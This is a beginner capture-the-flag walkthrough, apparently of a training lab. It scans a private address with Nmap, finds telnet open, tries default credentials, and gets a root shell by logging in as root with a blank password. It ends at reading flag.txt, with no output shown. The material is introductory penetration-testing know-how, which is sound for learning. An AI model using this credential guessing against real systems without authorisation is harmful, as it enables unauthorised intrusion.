**Difficulty**: Easy  
**Objective**: Exploiting Misconfigured Telnet Exploitation
**Tools Used**: Nmap


### Introduction

**What it is?** Telnet is a network protocol used to provide a text-based communication to remotely access a system over a network. 
**Port?** 23
**What you can do with it?** Allows users to execute command remotely on a remote server or device as if they were physically present. Has been largely obsolete these days due to its lack of security.

Basically, the client initiates a conntection to the server. Once connected the server grants a CLI for interaction. All credentials are transmitted in plain text making it highly vulnerable to eavesdropping attacks.

**Command**:
```
telnet <hostname or ip address> <port>
```


### Enumeration

Assuming your connections are established and the ping was successful.
We use Nmap which is a Network Mapper whose goal is to send requests to ports of your choice, or all 65535 or even by default the top 1000 ports and returns which are open, filtered or closed.

This time we will use Nmap with the -sV flag to enumerate the services and their versions being used. Do this as:

```
$ sudo nmap -sV 10.129.1.17
[sudo] password for ghost: 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-13 13:53 IST
Nmap scan report for 10.129.1.17
Host is up (2.3s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.29 seconds
```

Clearly, it can be observed that at port number 23, Telnet with Linux Telnetd is open.
Also, the server uses a Linux OS.


### Trying Telnet Connection

After knowing telnet is open at 23, let's fire telnet up at ip address 10.129.1.17 as:
```
$ telnet 10.129.1.17
Trying 10.129.1.17...
Connected to 10.129.1.17.
Escape character is '^]'.

Meow login:

Let's try to bruteforce our way in. I tried combinations:
- admin: admin
- admin: 
- : admin
But none of the defaults worked.

However, sometimes due to confiuration mistakes, some important accounts are left with blank passwords for easy accessibility. Some typic important accounts are:
- admin
- administrator
- root

After trying the three, here's what we got:

Voila! We have remote access.


### FInding the Flag

(It's ironic for me to say finding the flag, but technically I am)
Let's go ahead and list all files using `ls` command.
```
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
